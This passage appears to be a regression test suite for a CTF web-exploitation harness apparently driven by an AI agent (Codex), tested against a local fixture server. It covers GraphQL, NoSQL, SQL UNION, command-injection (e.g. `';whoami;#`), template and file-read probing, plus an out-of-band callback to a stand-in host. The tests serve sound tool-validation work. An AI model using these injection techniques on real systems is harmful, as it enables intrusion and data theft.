const B = `mutation { deleteUser(id: 3) { ok } }`;
const C = `query ($userId: ID!) { user(id: $userId) { apiKey } }`;
const D = gql`{ viewer { id token } }`;
var E = "query{account{balance}}";
function query() { return 1; }
const obj = { query (selector) { return document.querySelector(selector); } };
class Repo { query(a, b) { return this.db.find(a, b); } }
if (query) { doThing(); }
const mutation = { type: 'noop' };
api.query({ limit: 10 });
var t=document.querySelector("head");if(!e)return;const u=e.firstChild;if(o){var r;if(u&&null!=(r=u.hasAttribute)){K(r),J(r,o)}}
var w=n.querySelectorAll('style[data-emotion^="'+t+' "]'),function(e){for(var t=e.getAttribute("data-emotion").split(" "),n=1;n<t.length;n++)l[t[n]]=!0}
'''
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "anon.js"), "w", encoding="utf-8") as fh:
                fh.write(bundle)
            proc = run_full("jsmine.py", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            # Exactly the five real operations, and none of the six JS lookalikes.
            self.assertIn("=== GRAPHQL OPERATIONS (5) ===", proc.stdout)
            for root in ("users", "deleteUser", "user", "viewer", "account"):
                self.assertIn("roots=%s" % root, proc.stdout)
            self.assertIn("query (anonymous)", proc.stdout)
            self.assertIn("mutation (anonymous)", proc.stdout)
            self.assertIn("identity-vars=userId", proc.stdout)
            for lookalike in ("querySelector", "this.db.find", "doThing",
                              "query Selector", "data-emotion"):
                self.assertNotIn(lookalike, proc.stdout)


class GraphqlquickRegressionTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_disabled_introspection_schema_oracle_finds_sensitive_field_flag(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "graphqlquick.py", "--url", self.base_url + "/api/graphql",
                "--token", "low-priv-token", "--id", "4", "--delay", "0",
                "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            marker = "bug" + "{GraphqlQuickRegression123}"
            self.assertIn("introspection unavailable", proc.stdout)
            self.assertIn("FLAG " + marker, proc.stdout)
            log = os.path.join(tmp, "probes.jsonl")
            self.assertTrue(os.path.isfile(log))
            with open(log, encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertLessEqual(len(records), 48)
            self.assertTrue(any(not record["authenticated"] for record in records),
                            "anonymous reachability was not compared")
            self.assertTrue(all("mutation" not in record["query"].lower()
                                for record in records),
                            "generic GraphQL fast track must remain read-only")
            self.assertTrue(any("user(id: 1) { password }" in record["query"]
                                for record in records))

    def test_malformed_header_reads_as_an_argument_error_not_a_safety_refusal(self):
        """SAFETY REFUSAL is reserved for the mutation guard.

        Both faults exit 4, but mid-engagement the label is the whole message:
        a typo'd --header reporting a safety refusal reads as the harness
        declining to send something, which is a different and alarming claim.
        """
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "graphqlquick.py", "--url", self.base_url + "/api/graphql",
                "--header", "X-Broken", "--out", tmp)
            self.assertEqual(proc.returncode, 4, proc.stdout + proc.stderr)
            self.assertIn("INVALID ARGUMENT", proc.stderr)
            self.assertNotIn("SAFETY REFUSAL", proc.stderr)

    def test_probe_budget_is_a_clean_bounded_stop(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "graphqlquick.py", "--url", self.base_url + "/api/graphql",
                "--token", "low-priv-token", "--id", "4", "--delay", "0",
                "--max-probes", "3", "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("BOUNDED STOP", proc.stderr)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                self.assertEqual(sum(1 for line in fh if line.strip()), 3)


class NosqlquickRegressionTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def base_args(self, endpoint="/api/account/recover"):
        return [
            "--url", self.base_url + endpoint,
            "--field", "email", "--field", "backupCode",
            "--baseline", "email=nobody@example.test",
            "--baseline", "backupCode=invalid",
            "--success-json", "status=verified", "--delay", "0",
        ]

    def test_paired_operator_probe_marks_single_guard_negatives_unknown(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full("nosqlquick.py", *self.base_args(), "--probe",
                            "--map-query-shape", "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("CONFIRMED", proc.stdout)
            self.assertIn("guard-blocked/unknown", proc.stdout)
            self.assertIn("extra scalar field appears ignored", proc.stdout)
            self.assertTrue(os.path.isfile(os.path.join(tmp, "probes.jsonl")))

    def test_gt_identity_enumeration_is_monotonic(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full("nosqlquick.py", *self.base_args(),
                            "--enumerate", "email", "--identity-json", "email",
                            "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("alpha@example.test", proc.stdout)
            self.assertIn("whiskers@example.test", proc.stdout)
            self.assertIn("enumerated 2 unique", proc.stdout)

    def test_variable_length_printable_ascii_extraction(self):
        with tempfile.TemporaryDirectory() as tmp:
            args = self.base_args()
            args += ["--lock", "email=whiskers@example.test",
                     "--extract", "backupCode", "--max-length", "32", "--out", tmp]
            proc = run_full("nosqlquick.py", *args, timeout=30)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("extracted backupCode = bug{aZ9}", proc.stdout)

    def test_nested_query_operators_require_dollar_and_keep_full_results(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "nosqlquick.py", "--url", self.base_url + "/api/items",
                "--query-container", "filter", "--field", "is_public",
                "--baseline", "is_public=true", "--delay", "0", "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("bare [ne]", proc.stdout)
            self.assertIn("[$ne]", proc.stdout)
            self.assertIn("CANDIDATE", proc.stdout)
            self.assertIn("FLAG:", proc.stdout,
                          "the complete expanded list must be scanned, not just its first row")
            bare = os.path.join(tmp, "responses", "query-is_public-bare-ne-control.body")
            injected = os.path.join(tmp, "responses", "query-is_public-ne.body")
            with open(bare, encoding="utf-8") as fh:
                self.assertNotIn('"name": "private"', fh.read())
            with open(injected, encoding="utf-8") as fh:
                body = fh.read()
            self.assertIn('"name": "public-one"', body,
                          "$ne type juggling can retain public rows")
            self.assertIn('"name": "private"', body,
                          "the full result set must expose the added private row")

    def test_auth_and_password_fields_require_explicit_dangerous_opt_in(self):
        proc = run_full(
            "nosqlquick.py", "--url", self.base_url + "/api/login",
            "--field", "username", "--field", "password", "--delay", "0")
        self.assertEqual(proc.returncode, 4, proc.stdout + proc.stderr)
        self.assertIn("SAFETY REFUSAL", proc.stderr)

    def test_rate_limit_is_inconclusive_and_gateway_trips_circuit_breaker(self):
        with tempfile.TemporaryDirectory() as rate_tmp, tempfile.TemporaryDirectory() as crash_tmp:
            rate = run_full("nosqlquick.py", *self.base_args("/api/nosql-rate-limit"),
                            "--out", rate_tmp)
            self.assertEqual(rate.returncode, 2, rate.stdout + rate.stderr)
            self.assertIn("INCONCLUSIVE", rate.stderr)
            crash = run_full("nosqlquick.py", *self.base_args("/api/nosql-crash"),
                             "--out", crash_tmp)
            self.assertEqual(crash.returncode, 3, crash.stdout + crash.stderr)
            self.assertIn("CIRCUIT BREAKER", crash.stderr)


class FlaghookSyntheticDetectionTest(unittest.TestCase):
    """flaghook.py is the PostToolUse safety net that scans every tool result for a
    flag pattern; SKILL.md tells an operator to 'verify it with a fake flag after
    changing tool surfaces'. This exercises that verification path directly: a
    synthetic flag anywhere in the hook's stdin payload must exit 2 (surfacing
    stderr back to Codex) and land in ~/.codex/ctf-flags.log."""

    def test_synthetic_flag_in_tool_output_is_detected_and_logged(self):
        with tempfile.TemporaryDirectory() as tmp:
            marker = "bug{HarnessRegressionSynthetic123}"
            payload = json.dumps({"tool_name": "Bash", "tool_response": marker})
            proc = run_full("flaghook.py", input_text=payload, env={"HOME": tmp})
            self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
            log = os.path.join(tmp, ".codex", "ctf-flags.log")
            self.assertTrue(os.path.isfile(log), "flaghook did not create ctf-flags.log")
            with open(log, encoding="utf-8") as fh:
                self.assertIn(marker, fh.read())


class FlagPatternAnchorTest(unittest.TestCase):
    """The shared flag pattern must not fire mid-word.

    `bug` and `RM` are prefixes in the alternation, and unanchored they match
    inside ordinary markup: `.form{margin:0}` contains `rm{...}` and
    `.debug{...}` contains `bug{...}`. Every probing script treats a flag hit as
    a terminal success -- it prints FLAG and stops -- so a stylesheet in a WAF
    block page could end a run with a wrong answer. A left boundary is the cheap
    fix; a separator that is not alphanumeric (`"`, `_`, `>`, space) still
    matches, so real flags are unaffected.
    """

    def _mine(self, blob):
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "styles.js"), "w", encoding="utf-8") as fh:
                fh.write(blob)
            proc = run_full("jsmine.py", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            return proc.stdout

    def test_css_lookalikes_do_not_register_as_flags(self):
        # Every one of these contains `rm{...}` or `bug{...}` as a substring, and
        # the scanning scripts accept any non-brace payload between the braces.
        for blob in ('const s = ".form{margin:0;padding:0}";',
                     'el.innerHTML = "<style>form{border:0;outline:0}</style>";',
                     'const d = "a.debug{color:red;font-weight:bold}";',
                     'const p = ".subform{display:none;opacity:0}";'):
            self.assertNotIn("FLAG PATTERN IN BUNDLE", self._mine(blob),
                             "%r was treated as a flag" % blob)

    def test_real_flags_still_detected_next_to_any_separator(self):
        marker = "bug" + "{AnchorRegressionCheck123}"
        for blob in (marker, '{"password":"%s"}' % marker, "user_%s" % marker,
                     "X-Flag: %s" % marker, ">%s<" % marker):
            out = self._mine("const leaked = %r;" % blob)
            self.assertIn("FLAG PATTERN IN BUNDLE", out,
                          "%r was not detected as a flag" % blob)
            self.assertIn(marker, out)


class FlaghookHealthMarkerTest(unittest.TestCase):
    """A synthetic flag proves the script's own regex works, but the Shady Oaks
    Financial run showed that alone isn't enough: the same session's real
    PostToolUse hook produced no log entry for either a real flag or a synthetic
    one, because invoking flaghook.py directly only proves the script -- never
    whether PostToolUse actually calls it. A dedicated bug{CodexHarnessHookCheck_
    <nonce>} marker gives an end-to-end activation check: it must land in
    ~/.codex/ctf-flaghook-ok, a sentinel kept separate from ctf-flags.log so a
    routine activation check never pollutes the real flag record."""

    def test_flaghook_health_marker_writes_sentinel_not_flag_log(self):
        with tempfile.TemporaryDirectory() as tmp:
            marker = "bug{CodexHarnessHookCheck_regressiontest01}"
            payload = json.dumps({"tool_name": "Bash", "tool_response": marker})
            proc = run_full("flaghook.py", input_text=payload, env={"HOME": tmp})
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            sentinel = os.path.join(tmp, ".codex", "ctf-flaghook-ok")
            self.assertTrue(os.path.isfile(sentinel),
                            "flaghook did not write the health-check sentinel")
            with open(sentinel, encoding="utf-8") as fh:
                self.assertEqual(fh.read().strip(), marker)
            self.assertFalse(os.path.exists(os.path.join(tmp, ".codex", "ctf-flags.log")),
                             "a health-check marker must never be logged as a real flag")


class SqlquickPathParamTest(unittest.TestCase):
    """A REST id lives in the path, where sqlquick could not reach it at all: --param
    names a *query* parameter and url_for() only rebuilt the query string. On CafeClub
    that made the tool structurally incapable of finding the planted bug, and a `1'`
    probe returning "not found" -- what a *bound* integer does too -- read as proof the
    id was parameterized. Only a boolean differential separates the two."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_quote_probe_cannot_distinguish_bound_from_concatenated(self):
        """The premise of the whole change: the cheap probe is uninformative here."""
        import urllib.error
        import urllib.parse
        import urllib.request
        seen = {}
        for route in ("widgets", "gadgets"):
            url = "%s/api/%s/%s" % (self.base_url, route, urllib.parse.quote("1'", safe=""))
            try:
                with urllib.request.urlopen(url, timeout=10) as r:
                    seen[route] = r.status
            except urllib.error.HTTPError as e:
                seen[route] = e.code
        self.assertEqual(seen["widgets"], seen["gadgets"],
                         "fixture no longer models the ambiguity this guards against")

    def test_path_param_union_reaches_the_flag(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = run("sqlquick.py", "--url", self.base_url + "/api/widgets/1",
                      "--path-param", "--delay", "0", "--out", tmp, timeout=180)
        self.assertIn("STRONG DIFFERENTIAL", out)
        self.assertIn("column count: 3", out)
        # The payoff: a single-row endpoint must still surrender the users table, which
        # requires emptying the UNION's left side and avoiding a literal % in the path.
        self.assertIn("bug{fixture_path_param_union_ok}", out,
                      "path-param UNION did not reach the flag:\n" + out)

    def test_marker_url_form_is_equivalent(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = run("sqlquick.py", "--url", self.base_url + "/api/widgets/*",
                      "--seed", "1", "--delay", "0", "--out", tmp, timeout=180)
        self.assertIn("STRONG DIFFERENTIAL", out)

    def test_bound_path_param_is_not_reported_injectable(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = run("sqlquick.py", "--url", self.base_url + "/api/gadgets/1",
                      "--path-param", "--delay", "0", "--out", tmp, timeout=180)
        self.assertNotIn("STRONG DIFFERENTIAL", out)
        self.assertNotIn("bug{fixture_path_param_union_ok}", out)


class SqlquickSweepTest(unittest.TestCase):
    """--sweep triages every {...} in methods.txt. Its three verdicts must stay
    distinct: injectable, clean, and *untested*. Collapsing "no id answered" into
    "no differential" is the mistake the loop gate calls a negative from behind a
    tripped guard -- on an auth-gated API every id 401s before login, so a sweep that
    reported those as clean would retire the vector without testing it once."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def sweep(self, methods_text):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "methods.txt")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(methods_text)
            return run("sqlquick.py", "--sweep", "--base", self.base_url,
                       "--methods", path, "--delay", "0",
                       "--out", os.path.join(tmp, "out"), timeout=180)

    def test_sweep_separates_injectable_from_bound(self):
        out = self.sweep("GET    /api/widgets/{...}\nGET    /api/gadgets/{...}\n")
        self.assertRegex(out, r"/api/widgets/\{\.\.\.\}.*INJECTABLE")
        self.assertRegex(out, r"/api/gadgets/\{\.\.\.\}.*no differential")
        self.assertIn("--seed", out,
                      "sweep should print a ready-to-run confirmation command")

    def test_auth_gated_ids_report_untested_not_clean(self):
        """The CafeClub pre-auth case: ctf-init sweeps before a token exists, every id
        401s, and nothing is actually tested. Reporting that as clean would retire the
        vector that held the flag."""
        out = self.sweep("GET    /api/vaults/{...}\n")
        self.assertIn("UNTESTED", out)
        self.assertIn("not cleared", out)
        self.assertNotIn("no differential", out)

    def test_sweep_tests_a_non_trailing_placeholder(self):
        """/api/products/{...}/reviews puts the id in the middle; a sweep that only
        handled a trailing placeholder would never test the injectable position."""
        out = self.sweep("GET    /api/widgets/{...}/detail\n")
        self.assertIn("[param 1]", out)

    def test_sweep_ignores_routes_without_a_path_parameter(self):
        out = self.sweep("GET    /api/widgets\nPOST   /api/login\n")
        self.assertIn("nothing to sweep", out)


class CmdiquickRegressionTest(unittest.TestCase):
    """A command-shaped scalar may live in any HTTP transport. The helper must
    preserve a valid request, mutate one explicit location, require strong output
    evidence, continue from ``id`` to ``whoami`` for the flag, and never turn a
    reflection, invalid baseline, throttle, or gateway failure into a finding."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def run_cmdi(self, *args, out=None, timeout=30):
        command = list(args) + ["--delay", "0"]
        if out is not None:
            command += ["--out", out]
            return run_full("cmdiquick.py", *command, timeout=timeout)
        with tempfile.TemporaryDirectory() as tmp:
            command += ["--out", tmp]
            return run_full("cmdiquick.py", *command, timeout=timeout)

    def assert_confirmed(self, proc, location):
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertIn("INJECTABLE " + location, proc.stdout)
        expected = "bug" + "{CmdiQuickRegression123}"
        self.assertIn("FLAG " + expected, proc.stdout)

    def test_diceforge_json_reaches_flag_in_three_requests(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = self.run_cmdi(
                "--url", self.base_url + "/api/cmdi/json",
                "--json", '{"dice":[{"type":"d100","count":1}],"rollOptions":"none"}',
                "--field", "rollOptions", out=tmp)
            self.assert_confirmed(proc, "json:rollOptions")
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual([record["label"] for record in records],
                             ["baseline", "posix-id", "posix-whoami"])

    def test_nested_json_path_is_mutated_without_changing_siblings(self):
        proc = self.run_cmdi(
            "--url", self.base_url + "/api/cmdi/json-nested",
            "--json", '{"wrapper":[{"rollOptions":"none","keep":"same"}]}',
            "--field", "wrapper[0].rollOptions")
        self.assert_confirmed(proc, "json:wrapper[0].rollOptions")

    def test_query_form_path_header_and_raw_multipart_transports(self):
        cases = [
            ("query:host", ["--url", self.base_url + "/api/cmdi/query?host=localhost",
                            "--param", "host"]),
            ("form:host", ["--url", self.base_url + "/api/cmdi/form",
                           "--form", "host=localhost&mode=fast", "--field", "host"]),
            ("path:*", ["--url", self.base_url + "/api/cmdi/path/*",
                        "--path-marker", "*", "--seed", "localhost"]),
            ("header:X-Diagnostic-Host", ["--url", self.base_url + "/api/cmdi/header",
                                          "--header", "X-Diagnostic-Host: localhost",
                                          "--inject-header", "X-Diagnostic-Host"]),
        ]
        for location, args in cases:
            with self.subTest(location=location):
                self.assert_confirmed(self.run_cmdi(*args), location)

        with tempfile.TemporaryDirectory() as tmp:
            request_path = os.path.join(tmp, "multipart.request")
            body = (
                "POST /api/cmdi/raw HTTP/1.1\r\n"
                "Host: ignored.example\r\n"
                "Content-Type: multipart/form-data; boundary=cmdiquick\r\n"
                "\r\n"
                "--cmdiquick\r\n"
                "Content-Disposition: form-data; name=\"upload\"; filename=\"CMDI_INJECT\"\r\n"
                "Content-Type: text/plain\r\n\r\nfixture\r\n--cmdiquick--\r\n"
            )
            with open(request_path, "wb") as fh:
                fh.write(body.encode("latin-1"))
            proc = self.run_cmdi(
                "--url", self.base_url, "--request-file", request_path,
                "--marker", "CMDI_INJECT", "--seed", "report.txt")
            self.assert_confirmed(proc, "raw:CMDI_INJECT")

    def test_reflection_only_endpoint_is_inconclusive(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = self.run_cmdi(
                "--url", self.base_url + "/api/cmdi/safe",
                "--json", '{"rollOptions":"none"}', "--field", "rollOptions", out=tmp)
            self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
            self.assertNotIn("INJECTABLE", proc.stdout)
            self.assertIn("no strong command-execution differential", proc.stdout)

        header = self.run_cmdi(
            "--url", self.base_url + "/api/cmdi/header-safe",
            "--header", "X-Diagnostic-Host: localhost",
            "--inject-header", "X-Diagnostic-Host")
        self.assertEqual(header.returncode, 2, header.stdout + header.stderr)
        self.assertNotIn("CIRCUIT BREAKER", header.stdout)

    def test_invalid_baseline_rate_limit_and_gateway_stop_immediately(self):
        cases = [
            (["--url", self.base_url + "/api/cmdi/json", "--json", '{}',
              "--field", "rollOptions"], 4, "JSON field path does not exist", 0),
            (["--url", self.base_url + "/api/cmdi/json", "--json", '{"rollOptions":"none"}',
              "--field", "rollOptions"], 2, "known-valid baseline", 1),
            (["--url", self.base_url + "/api/cmdi/rate", "--json", '{"value":"none"}',
              "--field", "value"], 2, "429 rate limit", 1),
            (["--url", self.base_url + "/api/cmdi/gateway", "--json", '{"value":"none"}',
              "--field", "value"], 3, "CIRCUIT BREAKER", 1),
        ]
        for args, code, marker, expected_records in cases:
            with self.subTest(marker=marker), tempfile.TemporaryDirectory() as tmp:
                proc = self.run_cmdi(*args, out=tmp)
                self.assertEqual(proc.returncode, code, proc.stdout + proc.stderr)
                self.assertIn(marker, proc.stdout + proc.stderr)
                log_path = os.path.join(tmp, "probes.jsonl")
                count = 0
                if os.path.exists(log_path):
                    with open(log_path, encoding="utf-8") as fh:
                        count = sum(1 for line in fh if line.strip())
                self.assertEqual(count, expected_records)

    def test_blind_timing_requires_explicit_option_and_paired_differential(self):
        proc = self.run_cmdi(
            "--url", self.base_url + "/api/cmdi/blind",
            "--json", '{"rollOptions":"none"}', "--field", "rollOptions",
            "--blind-time", "1", timeout=40)
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertIn("paired timing differential", proc.stdout)

    def test_windows_marker_chain_and_probe_budget(self):
        windows = self.run_cmdi(
            "--url", self.base_url + "/api/cmdi/json",
            "--json", '{"dice":[],"rollOptions":"none"}', "--field", "rollOptions",
            "--os", "windows")
        self.assert_confirmed(windows, "json:rollOptions")
        self.assertIn("execution-only marker", windows.stdout)

        with tempfile.TemporaryDirectory() as tmp:
            budget = self.run_cmdi(
                "--url", self.base_url + "/api/cmdi/safe",
                "--json", '{"rollOptions":"none"}', "--field", "rollOptions",
                "--max-probes", "1", out=tmp)
            self.assertEqual(budget.returncode, 2, budget.stdout + budget.stderr)
            self.assertIn("probe budget reached (1)", budget.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                self.assertEqual(sum(1 for line in fh if line.strip()), 1)
            with open(os.path.join(tmp, "summary.json"), encoding="utf-8") as fh:
                self.assertEqual(json.load(fh)["status"], "UNTESTED_BUDGET")

    def test_auto_retains_windows_and_powershell_winning_dialects(self):
        cases = [
            ("windows", "windows-ampersand-marker", "windows-whoami"),
            ("powershell", "powershell-semicolon-marker", "powershell-whoami"),
        ]
        for route, marker_label, follow_label in cases:
            with self.subTest(route=route), tempfile.TemporaryDirectory() as tmp:
                proc = self.run_cmdi(
                    "--url", self.base_url + "/api/cmdi/" + route,
                    "--json", '{"rollOptions":"none"}', "--field", "rollOptions",
                    out=tmp)
                self.assert_confirmed(proc, "json:rollOptions")
                with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                    records = [json.loads(line) for line in fh if line.strip()]
                labels = [record["label"] for record in records]
                self.assertIn(marker_label, labels)
                self.assertEqual(labels[-1], follow_label)
                self.assertEqual(records[-1]["dialect"], route)

    def test_quote_breakout_reuses_exact_winning_wrapper(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = self.run_cmdi(
                "--url", self.base_url + "/api/cmdi/quote-posix",
                "--json", '{"rollOptions":"none"}', "--field", "rollOptions",
                "--os", "posix", out=tmp)
            self.assert_confirmed(proc, "json:rollOptions")
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(records[-2]["wrapper"], "posix-single-quote")
            self.assertEqual(records[-1]["wrapper"], "posix-single-quote")
            self.assertIn("';whoami;#", records[-1]["mutation"])

    def test_cookie_raw_body_duplicate_occurrence_and_non_2xx_baseline(self):
        cases = [
            ("cookie:target", [
                "--url", self.base_url + "/api/cmdi/cookie",
                "--cookie", "session=abc; target=localhost; mode=fast",
                "--cookie-param", "target",
            ]),
            ("query:host[2]", [
                "--url", self.base_url + "/api/cmdi/query-duplicate?host=safe&host=localhost",
                "--param", "host", "--occurrence", "2",
            ]),
            ("json:rollOptions", [
                "--url", self.base_url + "/api/cmdi/teapot", "--method", "POST",
                "--json", '{"rollOptions":"none"}', "--field", "rollOptions",
                "--baseline-status", "418",
            ]),
        ]
        for location, args in cases:
            with self.subTest(location=location):
                self.assert_confirmed(self.run_cmdi(*args), location)

        with tempfile.TemporaryDirectory() as tmp:
            body_path = os.path.join(tmp, "request.xml")
            with open(body_path, "w", encoding="utf-8") as fh:
                fh.write("<request><host>CMDI_INJECT</host><mode>fast</mode></request>")
            proc = self.run_cmdi(
                "--url", self.base_url + "/api/cmdi/body", "--method", "POST",
                "--body-file", body_path, "--marker", "CMDI_INJECT",
                "--seed", "localhost", "--content-type", "application/xml")
            self.assert_confirmed(proc, "body:CMDI_INJECT")

    def test_all_dialect_timing_adapters(self):
        for dialect in ("windows", "powershell"):
            with self.subTest(dialect=dialect):
                proc = self.run_cmdi(
                    "--url", self.base_url + "/api/cmdi/blind-" + dialect,
                    "--json", '{"rollOptions":"none"}', "--field", "rollOptions",
                    "--os", dialect, "--blind-time", "1", timeout=40)
                self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
                self.assertIn(dialect, proc.stdout)
                self.assertIn("paired timing differential", proc.stdout)

        with tempfile.TemporaryDirectory() as tmp:
            substitution = self.run_cmdi(
                "--url", self.base_url + "/api/cmdi/blind-substitution",
                "--json", '{"rollOptions":"none"}', "--field", "rollOptions",
                "--os", "posix", "--blind-time", "1", out=tmp, timeout=40)
            self.assertEqual(
                substitution.returncode, 0, substitution.stdout + substitution.stderr)
            with open(os.path.join(tmp, "summary.json"), encoding="utf-8") as fh:
                self.assertEqual(json.load(fh)["wrapper"], "posix-dollar-substitution")

    def test_explicit_oob_nonce_must_appear_in_collector_log(self):
        with tempfile.TemporaryDirectory() as tmp:
            log_path = os.path.join(tmp, "oob.log")
            fixture_app.CMDI_OOB_LOG = log_path
            try:
                proc = self.run_cmdi(
                    "--url", self.base_url + "/api/cmdi/oob",
                    "--json", '{"rollOptions":"none"}', "--field", "rollOptions",
                    "--os", "posix", "--oob-url", "https://callback.test/cmdi",
                    "--oob-log", log_path, "--oob-wait", "0", out=tmp)
            finally:
                fixture_app.CMDI_OOB_LOG = None
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("verified OOB callback", proc.stdout)
            with open(log_path, encoding="utf-8") as fh:
                self.assertRegex(fh.read(), r'CMDIQ_[A-Z0-9]{12}')

            missing_log = os.path.join(tmp, "no-callback.log")
            negative = self.run_cmdi(
                "--url", self.base_url + "/api/cmdi/safe",
                "--json", '{"rollOptions":"none"}', "--field", "rollOptions",
                "--os", "posix", "--oob-url", "https://callback.test/cmdi",
                "--oob-log", missing_log, "--oob-wait", "0", out=tmp)
            self.assertEqual(negative.returncode, 2, negative.stdout + negative.stderr)
            self.assertNotIn("verified OOB callback", negative.stdout)


class TemplatequickRegressionTest(unittest.TestCase):
    """A valid evaluator response can disclose an undocumented template field that
    an empty-body route probe never reaches. The helper must round-trip only the
    response-only marker field, prove interpolation with a harmless context value,
    and stop immediately when a high-value variable returns a flag."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_response_only_placeholder_reaches_flag_in_bounded_chain(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "templatequick.py", "--url", self.base_url + "/api/indicator",
                "--token", "fixture-user",
                "--data", '{"stock_id":1,"formula":"10*10"}',
                "--delay", "0", "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("response-only placeholder field: caption={value}", proc.stdout)
            self.assertIn("client controls response field caption", proc.stdout)
            self.assertIn("INTERPOLATED caption {value} -> 100", proc.stdout)
            expected = "bug" + "{example_template_variable_fixture}"
            self.assertIn("FLAG " + expected, proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(len(records), 4, records)
            self.assertEqual(records[-1]["label"], "high-value:caption:flag")

    def test_no_placeholder_is_inconclusive_without_extra_requests(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "templatequick.py", "--url", self.base_url + "/api/feed/list",
                "--token", "fixture-user", "--data", '{}',
                "--delay", "0", "--out", tmp)
            self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
            self.assertIn("no top-level response-only single-brace marker", proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                self.assertEqual(sum(1 for line in fh if line.strip()), 1)

    def test_invalid_baseline_guard_stops_before_field_probes(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "templatequick.py", "--url", self.base_url + "/api/indicator",
                "--token", "fixture-user", "--data", '{"stock_id":1}',
                "--field", "caption", "--delay", "0", "--out", tmp)
            self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
            self.assertIn("known-valid baseline did not succeed (HTTP 400)", proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                self.assertEqual(sum(1 for line in fh if line.strip()), 1)

    def test_rate_limit_and_gateway_stop_before_field_probes(self):
        cases = (("/api/nosql-rate-limit", 2, "429 rate limit"),
                 ("/api/nosql-crash", 3, "CIRCUIT BREAKER"))
        for path, expected_code, marker in cases:
            with self.subTest(path=path), tempfile.TemporaryDirectory() as tmp:
                proc = run_full(
                    "templatequick.py", "--url", self.base_url + path,
                    "--data", '{}', "--field", "caption",
                    "--delay", "0", "--out", tmp)
                self.assertEqual(proc.returncode, expected_code, proc.stdout + proc.stderr)
                self.assertIn(marker, proc.stdout)
                with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                    self.assertEqual(sum(1 for line in fh if line.strip()), 1)


class LfiquickRegressionTest(unittest.TestCase):
    """A file-read helper must start from a real baseline, retain other query
    fields, compare authentication, reuse the exact successful wrapper, and scan
    both response bodies and headers without turning every differential into LFI."""

    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = fixture_app.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def url(self, mode="standard", file_value="/uploads/otter1.png", gate=None):
        url = "%s/api/post/image?mode=%s&file=%s" % (
            self.base_url, mode, file_value)
